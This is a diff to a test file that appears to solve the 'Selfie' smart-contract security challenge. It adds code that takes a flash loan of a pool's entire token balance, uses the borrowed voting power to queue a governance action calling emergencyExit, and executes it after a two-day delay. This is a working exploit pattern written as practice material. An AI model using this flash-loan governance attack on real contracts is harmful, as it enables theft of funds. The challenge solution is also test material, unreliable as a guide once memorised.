@@ -6,6 +6,9 @@ import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
 import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
+import {AttackPool} from "../../src/selfie/AttackPool.sol";
+import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
+
 
 contract SelfieChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -62,6 +65,11 @@ contract SelfieChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_selfie() public checkSolvedByPlayer {
+        AttackPool attackPool = new AttackPool(pool,governance,token);
+        bytes memory data1 = abi.encodeWithSelector(pool.emergencyExit.selector,address(recovery)); 
+        attackPool.attack(IERC3156FlashBorrower(attackPool),address(token),token.balanceOf(address(pool)),data1);
+        skip(2 days);
+        governance.executeAction(1);
         
     }
 
